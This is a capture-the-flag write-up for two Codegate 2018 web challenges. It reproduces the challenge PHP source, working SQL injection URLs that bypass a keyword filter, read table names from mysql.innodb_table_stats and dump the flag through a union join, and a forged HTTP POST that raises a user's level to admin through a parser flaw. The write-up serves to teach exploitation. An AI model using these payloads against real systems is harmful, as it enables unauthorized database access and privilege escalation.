# codegate 2018 Web writeup

## Simple CMS

**Reference: [write up from 0ops](https://ctftime.org/writeup/8619)**

This challenge is a sql injection challenge. In this challenge, we can get the source code of the CMS. First we can se that there is a waf for the whole cms:

waf.php

```php
<?php
	if(!defined('simple_cms')) exit();

	$method = $_SERVER['REQUEST_METHOD'];

	if($method !== 'GET' && $method !== 'POST'){
			exit('are you hacker?');
	}

	$filter_str = array('or', 'and', 'information', 'schema', 'procedure', 'analyse', 'order', 'by', 'group', 'into');

	function escape_str($array)
	{
	    if(is_array($array)) {
	        foreach($array as $key => $value) {
	            if(is_array($value)) {
	                $array[$key] = escape_str($value);
	            } else {
	                $array[$key] = filter($value);
	            }
	        }
	    }
	    else {
	        $array = filter($array);
	    }
	    return $array;
	}
	function filter($str){
		global $filter_str;

		foreach ($filter_str as $value) {
			if(stripos($str, $value) !== false){
				die('are you hacker?');
			}
		}
		return addslashes($str);
	}

	$_GET = escape_str($_GET);
	$_POST = escape_str($_POST);
	$_COOKIE = escape_str($_COOKIE);
	$_REQUEST = escape_str($_REQUEST);
?>
```

We can see that some key words used in sql injection are filtered. The single quotation mark is also filtered.

Then we find that the author of the CMS use some sql api written by himself in  `DB.class.php`:

```php
<?php
	if(!defined('simple_cms')) exit();
	class DB{
		private static $db = null;
		public static function getInstance()
    	{
        	if (null === static::$db) {
        		static::$db = mysqli_connect($GLOBALS['db_host'], $GLOBALS['db_user'], $GLOBALS['db_password'], $GLOBALS['db_name']);
        	}
        	return static::$db;
    	}
        function insert($table, $query){
            $table = $GLOBALS['table_prefix'] . $table;

            $result = 'INSERT INTO ' . $table . ' ';

            $column = '';
            $data = '';
            foreach ($query as $key => $value) {
                $column .= '`' . $key . '`, ';
                $data .= "'{$value}', ";
            }

            $column = substr($column, 0, strrpos($column, ','));
            $data = substr($data, 0, strrpos($data, ','));

            $result .= "({$column}) VALUES ({$data})";

            echo "<b>Insert Action</b></br>";
            echo $result . "</br>";
            $result = mysqli_query(static::$db, $result);
            return $result;
        }
        function update($table, $replace, $query, $operator=''){
            $table = $GLOBALS['table_prefix'] . $table;
            $result = 'UPDATE '.$table. ' SET ';

            foreach ($replace as $key => $value) {
                $result .= "{$key}='{$value}',";
            }

            $result = substr($result, 0, strrpos($result, ',')) . ' WHERE ';

            foreach ($query as $key => $value) {
                $result .= "{$key}='{$value}' {$operator} ";
            }

            if($operator){
                $result = trim(substr($result, 0, strrpos($result, $operator)));
            }
            else{
                $result = trim($result);
            }
            echo "<b>Update Action</b></br>";
            echo $result . "</br>";
            $result = mysqli_query(static::$db, $result);
            return $result;
        }
        function fetch_row($table, $query=array(), $operator=''){
            $table = $GLOBALS['table_prefix'] . $table;
            $result = 'SELECT * FROM '. $table;

            if($query){
                $result .=  ' WHERE ';

                foreach ($query as $key => $value) {
                    $result .= "{$key}='{$value}' {$operator} ";
                }
                if($operator){
                    $result = trim(substr($result, 0, strrpos($result, $operator)));
                }
                else{
                    $result = trim($result);
                }
            }
            echo "<b>Fetch row Action</b></br>";
            echo $result . "</br>";
            $result = mysqli_query(static::$db, $result);
            if(!$result){
                exit(mysqli_error(static::$db));
            }
            return mysqli_fetch_array($result, MYSQLI_ASSOC);
        }
        function fetch_multi_row($table, $query=array(), $operator='', $limit='', $orderby='', $condition=''){
            $table = $GLOBALS['table_prefix'] . $table;
            $result = 'SELECT * FROM '. $table;
            if($condition){
                $result .= ' WHERE '. $condition;
            }
            else if($query){
                $result .=  ' WHERE ';

                foreach ($query as $key => $value) {
                    $result .= "{$key}='{$value}' {$operator} ";
                }
                if($operator){
                    $result = trim(substr($result, 0, strrpos($result, $operator)));
                }
                else{
                    $result = trim($result);
                }
            }
            else{
                $result .= ' WHERE 1 ';
            }
            if($orderby){
                $result .= ' order by '.$orderby;
            }
            if($limit){
                $result .= ' limit '. $limit;
            }
            echo "<b>Fetch multi row Action</b></br>";
            echo $result . "</br>";
            $result = mysqli_query(static::$db, $result);
            if(!$result){
                exit(mysqli_error(static::$db));
            }
            $tmp = array();
            $i = 0;
            while($row = mysqli_fetch_array($result, MYSQLI_ASSOC)){
                $tmp[$i] = $row;
                $i++;
            }
            return $tmp;
        }

	}
?>
```

The vulnerable is in function `fetch_multi_row` and `fetch_row`, which we can control part of the sql statement that is not in single quotations in `where` and `order by` and `limit` statement.

In file `Board.class.php`, function `action_search` seems vulnerable, which calls another function `get_search_query` to generate sql statement. Let's get a closer look at this function:

```php
	function get_search_query($column, $search, $operator){
		$column = explode('|', $column);
		$result = '';
		for($i=0; $i<count($column); $i++){
			if(trim($column[$i]) === ''){
				continue;
			}
			$result .= " LOWER({$column[$i]}) like '%{$search}%' {$operator}";
		}
		$result = trim(substr($result, 0 , strrpos($result, $operator)));
		return $result;
	}
```

As we can see, the final query statement contain the variable `$column` and `$search`, which could be controlled by attacker. To get further usage of this function, we need to know that function `mysqli_query` can execute lines of sql statements. So we use `$column` to start a new line and use `$search` to query in a new line, like:

```html
http://13.125.3.183/index.php?act=board&mid=search&col=title%23&type=1&search=test%0a)%23
```

Then we have to get the table name and column name in database. Since key words "information" and "schema" are in black list, we use `innodb_table_stats` to get the table name:

```html
http://13.125.3.183/index.php?act=board&mid=search&col=title%23&type=1&search=test%0a)%3C0%20union%20select%201,(select%20table_name%20from%20mysql.innodb_table_stats%20limit%202,1),3,4,5%23
```

At last, we use `join` to get flag:

```html
http://13.125.3.183/index.php?act=board&mid=search&col=title%23&type=1&search=test%0A)%3C0%20union%20(select%201,t.*%20from%20mysql.user%20join%2041786c497656426a6149_flag%20t)%23
```

## rbSql

We can also get the source code of this challenge too, which is a data storage system written in php. The rbSql will store user information in file and read it again when user login and then check if user is admin.

```php
  elseif($page == "me"){
    echo "<p>uid : {$_SESSION['uid']}</p><p>level : ";
    if($_SESSION['lvl'] == 1) echo "Guest";
    elseif($_SESSION['lvl'] == 2) echo "Admin";
    echo "</p>";
    include "dbconn.php";
    $ret = rbSql("select","member_".$_SESSION['uid'],["id",$_SESSION['uid']]);
    echo "<p>mail : {$ret['1']}</p><p>ip : {$ret['3']}</p>";
    if($_SESSION['lvl'] === "2"){
      echo "<p>Flag : </p>";
      include "/flag";
      echo "flag{XXXXXXXXXXXXXXXXXXXXXXXXXXXX}";
      rbSql("delete","member_".$_SESSION['uid'],["id",$_SESSION['uid']]);
    }
  }
```

If the user's `lvl` value is 2, we get the flag. So let's have a closer look at the data storage system:

```php
<?php
/*
Table[
  tablename, filepath
  [column],
  [row],
  [row],
  ...
rbSqlSchema[
  rbSqlSchema,/rbSqlSchema,
  ["tableName","filePath"],
  ["something","/rbSql_".substr(md5(rand(10000000,100000000)),0,16)]
]
*/

define("STR", chr(1), true);
define("ARR", chr(2), true);
define("SCHEMA", "../../rbSql/rbSqlSchema", true);

function rbSql($cmd,$table,$query){
	switch($cmd){
	case "create":
		$result = rbReadFile(SCHEMA);
		for($i=3;$i<count($result);$i++){
			if(strtolower($result[$i][0]) === strtolower($table)){
				return "Error6";
			}
		}
		$fileName = "../../rbSql/rbSql_".substr(md5(rand(10000000,100000000)),0,16);
		$result[$i] = array($table,$fileName);
		rbWriteFile(SCHEMA,$result);
		exec("touch {$fileName};chmod 666 {$fileName}");
		$content = array($table,$fileName,$query);
		rbWriteFile($fileName,$content);
		break;

	case "select":
		/*
		  Error1 : Command not found
		  Error2 : Column not found
		  Error3 : Value not found
		  Error4 : Table name not found
		  Error5 : Column count is different
		  Error6 : table name duplicate
		*/
		$filePath = rbGetPath($table);
		if(!$filePath) return "Error4";
		$result = rbReadFile($filePath);
		$whereColumn = $query[0];
		$whereValue = $query[1];
		$countRow = count($result) - 3;
		$chk = 0;
		for($i=0;$i<count($result[2]);$i++){
			if(strtolower($result[2][$i]) === strtolower($whereColumn)){
				$chk = 1;
				break;
			}
		}
		if($chk == 0) return "Error2";
		$chk = 0;
        print_r($result);
		for($j=0;$j<$countRow;$j++){
			if(strtolower($result[$j+3][$i]) === strtolower($whereValue)){
				$chk = 1;
				return $result[$j+3];
			}
		}
		if($chk == 0) return "Error3";
		break;

	case "insert":
        echo "Table: " . $table . "</br>\n";
		$filePath = rbGetPath($table);
		if(!$filePath) return "Error4";
		$result = rbReadFile($filePath);
		if(count($result[2]) != count($query)) return "Error5";
        $result[count($result)] = $query;
        print_r($result);
		rbWriteFile($filePath,$result);
		break;

	case "delete":
		$filePath = rbGetPath($table);
		if(!$filePath) return "Error4";
		$result = rbReadFile($filePath);
		$whereColumn = $query[0];
		$whereValue = $query[1];
		$countRow = count($result) - 3;
		$chk = 0;
		for($i=0;$i<count($result[2]);$i++){
			if(strtolower($result[2][$i]) === strtolower($whereColumn)){
				$chk = 1;
				break;
			}
		}
		if($chk == 0) return "Error2";
		$chk = 0;
		for($j=0;$j<$countRow;$j++){
			if(strtolower($result[$j+3][$i]) === strtolower($whereValue)){
				$chk = 1;
				unset($result[$j+3]);
			}
		}
		if($chk == 0) return "Error3";
		rbWriteFile($result[1],$result);
		break;

	default:
		return "Error1";
		break;
	}
}

function rbParse($rawData){
	$parsed = array();
	$idx = 0;
	$pointer = 0;

	while(strlen($rawData)>$pointer){
		if($rawData[$pointer] == STR){
			$pointer++;
			$length = ord($rawData[$pointer]);
			$pointer++;
			$parsed[$idx] = substr($rawData,$pointer,$length);
			$pointer += $length;
		}
		elseif($rawData[$pointer] == ARR){
			$pointer++;
			$arrayCount = ord($rawData[$pointer]);
			$pointer++;
			for($i=0;$i<$arrayCount;$i++){
				if(substr($rawData,$pointer,1) == ARR){
					$pointer++;
					$arrayCount2 = ord($rawData[$pointer]);
					$pointer++;
					for($j=0;$j<$arrayCount2;$j++){
						$pointer++;
						$length = ord($rawData[$pointer]);
						$pointer++;
						$parsed[$idx][$i][$j] = substr($rawData,$pointer,$length);
						$pointer += $length;
                    }
                    echo "Unpack subarray len: ";
                    echo $arrayCount2;
                    echo "\n";
                    echo "DATA:";
                    print_r($parsed[$idx][$i]);
			    }
				else{
					$pointer++;
					$length = ord(substr($rawData,$pointer,1));
					$pointer++;
					$parsed[$idx][$i] = substr($rawData,$pointer,$length);
					$pointer += $length;
				}
			}
            echo "Unpack array len: ";
            echo $arrayCount;
            echo "\n";
            echo "DATA:";
            print_r($parsed[$idx]);
		}
		$idx++;
		if($idx > 2048) break;
	}
	return $parsed[0];
}

function rbPack($data){
	$rawData = "";
	if(is_string($data)){
		$rawData .= STR . chr(strlen($data)) . $data;
	}
	elseif(is_array($data)){
        echo "Packing array len: ";
        echo ord(chr(count($data)));
        echo "\n";
        echo "DATA:";
        print_r($data);
		$rawData .= ARR . chr(count($data));
		for($idx=0;$idx<count($data);$idx++) $rawData .= rbPack($data[$idx]);
	}
	return $rawData;
}

function rbGetPath($table){
	$schema = rbReadFile(SCHEMA);
	for($i=3;$i<count($schema);$i++){
		if(strtolower($schema[$i][0]) == strtolower($table)) return $schema[$i][1];
	}
}

function rbReadFile($filePath){
	$opened = fopen($filePath, "r") or die("Unable to open file!");
	$content = fread($opened,filesize($filePath));
	fclose($opened);
	return rbParse($content);
}

function rbWriteFile($filePath,$fileContent){
	$opened = fopen($filePath, "w") or die("Unable to open file!");
    $content = rbPack($fileContent);
	fwrite($opened,$content);
	fclose($opened);
	clearstatcache();
}
```

After reading the source code, I find a interesting point that the function `rbPack` packs the data recursively, but the unpack function `rbParse` only use loop, and it doesn't check the type of data in the inner loop. So if we arrange our data carefully, we may forge the unpack function to change the user level.

We can easily find something controllable when we register:

```php
  elseif($page == "join_chk"){
    $uid = $_POST['uid'];
    $umail = $_POST['umail'];
    $upw = $_POST['upw'];
    if(($uid) && ($upw) && ($umail)){
      if(strlen($uid) < 3) error("id too short");
      if(strlen($uid) > 16) error("id too long");
      if(!ctype_alnum($uid)) error("id must be alnum!");
      if(strlen($umail) > 256) error("email too long");
      include "dbconn.php";
      $upw = md5($upw);
      $uip = $_SERVER['REMOTE_ADDR'];
      if(rbGetPath("member_".$uid)) error("id already existed");
      $ret = rbSql("create","member_".$uid,["id","mail","pw","ip","lvl"]);
      if(is_string($ret)) error("error");
      $ret = rbSql("insert","member_".$uid,[$uid,$umail,$upw,$uip,"1"]);
      if(is_string($ret)) error("error");
      exit("<script>location.href='./?page=login';</script>");
    }
    else error("join fail");
  }
```

The `umail` is controllable and long enough to make some fake information.

When we register a normal user, which is innocent, the storage file looks like this:

```
ARR
4
  STR
    (length of table name)
    table name string
  STR
    (length of path)
    path string
  ARR
  5 -> each member has 5 attributes
    STR
      2
      "id"
    STR
      4
      "mail"
    STR
      2
      "pw"
    STR
      2
      "ip"
    STR
      3
      "lvl"
  ARR
  5
  	STR
  	  (length of id)
  	  id
  	STR
  	  (length of mail)
  	  mail
  	STR
  	  (length of pw)
  	  pw
  	STR
  	  (length of ip)
  	  ip
  	STR
  	  (length of lvl)
  	  lvl
```

Our input data is stored the tail of the file. Since `pw`, `ip`, `id`, `lvl` is difficult to control, we use `mail` to overwrite the data behind it. When we pass `mail` to server as a array, we can write as much data into the file as we want. When `rbParse` function parse the email, the buggy function will consider the `mail` as a STR instead of an ARR. So let's see our payload:

```html
POST /a/b/?page=join_chk HTTP/1.1
Host: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Content-Length: 101
Cache-Control: max-age=0
Origin: http://59.108.116.175:9902
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://59.108.116.175:9902/a/b/?page=join
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=ff02df7dc3800b1b0b51c47068600d3e
Connection: close

uid=n0b0dy&umail[]=he&umail[]=f57de2db3c42252c1c1fc931bdbdee98&umail[]=127.0.0.2&umail[]=2&upw=n0b0dy
```

We pass `umail` to rbSql as a array, and the length of the array is 4. The first element in array is the fake `umail`, whose length should be array length minus the length of metadata(STR, length of string). So the length of `umail` should be 2. The second element is the fake password, which is the md5 value of `upw` string. The second element is the remote address, which can be any string in our payload. Then the last element is the user level, which should be set to "2" to get flag. The original data follows or payload will not be parsed. Send the payload then login, we can get the flag.